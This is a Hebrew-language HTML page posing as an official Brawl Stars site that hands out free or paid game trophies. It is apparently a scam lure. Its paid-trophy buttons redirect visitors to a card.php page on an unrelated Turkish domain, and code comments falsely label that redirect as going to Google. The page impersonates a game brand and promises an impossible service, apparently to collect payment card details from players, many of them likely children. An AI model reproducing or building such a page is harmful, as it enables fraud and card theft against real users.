<!DOCTYPE html>
<html lang="he">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>האתר בראול סטארס הרישמי לקבלת גביעים</title>
<style>
  body {
    font-family: Arial, sans-serif;
    text-align: center;
    background-image: url('background.jpg');
    background-size: cover;
    background-position: center;
    background-repeat: no-repeat;
    color: white;
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
    margin: 0;
  }
  .container {
    background-color: rgba(0, 0, 0, 0.7);
    padding: 20px;
    border-radius: 10px;
    max-width: 400px;
    width: 90%;
    position: relative; /* Added */
  }
  .button {
    padding: 10px 20px;
    font-size: 18px;
    background-color: #4CAF50;
    border: none;
    color: white;
    cursor: pointer;
    margin-top: 20px;
  }
  .button small {
    font-size: 14px;
    position: absolute;
    bottom: -20px;
    left: 50%;
    transform: translateX(-50%);
    display: none;
    color: white; /* Added */
  }
  .button:hover small {
    display: block;
  }
  .button:hover {
    background-color: #45a049;
  }
  .popup {
    display: none;
    position: fixed;
    z-index: 1;
    left: 0;
    top: 0;
    width: 100%;
    height: 100%;
    overflow: auto;
    background-color: rgba(0, 0, 0, 0.7);
  }
  .popup-content {
    background-color: #fefefe;
    margin: 15% auto;
    padding: 20px;
    border: 1px solid #888;
    width: 80%;
    max-width: 400px;
    border-radius: 10px;
    text-align: center;
  }
  .close {
    color: #aaa;
    float: right;
    font-size: 28px;
    font-weight: bold;
    cursor: pointer;
  }
  .close:hover,
  .close:focus {
    color: black;
    text-decoration: none;
    cursor: pointer;
  }
</style>
</head>
<body>

<div class="container">
  <h1> האתר הרישמי לקבלת גביעים בראול סטארס</h1>
  <p>קבל עד 1500 גביעים חינם</p>
  <button class="button" onclick="showPopup()">בחר מספר גבעים</button>
  <small class="button-small">*האתר לשימוש חד פעמי לחשבון</small>
</div>

<!-- חלון קופץ -->
<div id="popup" class="popup">
  <div class="popup-content">
    <span class="close" onclick="closePopup()">&times;</span>
    <p>:בחר אחת מהאפשרויות</p>
    <ul>
      <li><button class="button" onclick="redirectToHTML2()">🏆1500 גביעים חינם</button></li>
      <li><button class="button" onclick="redirectToGoogle('5000')">🏆5000 גביעים ב50₪</button></li>
      <li><button class="button" onclick="redirectToGoogle('10000')">🏆10000 גביעים ב90₪🎁</button></li>
    </ul>
  </div>
</div>

<script>
function showPopup() {
  document.getElementById("popup").style.display = "block";
}

function closePopup() {
  document.getElementById("popup").style.display = "none";
}

function redirectToHTML2() {
  // לעבור לדף ה-HTML של 2000 גבעים חינם
  window.location.href = 'page2.html';
}

function redirectToGoogle(type) {
  if (type === '5000') {
    // לעבור לגוגל עם 5000 בחמישים שקל
    window.location.href = 'http://ix-event.com.tr/SQ/PY/card.php?id=7039130805';
  } else if (type === '10000') {
    // לעבור לגוגל עם 10000 בתשעים שקל
    window.location.href = 'http://ix-event.com.tr/SQ/PY/card.php?id=7039130805';
  }
}

// קוד JavaScript חדש להצגת הטקסט הנדרש תמיד
document.querySelector('.button').addEventListener('mouseover', function() {
  document.querySelector('.button-small').style.display = 'block';
});

document.querySelector('.button').addEventListener('mouseout', function() {
  document.querySelector('.button-small').style.display = 'none';
});
</script>

</body>
</html>
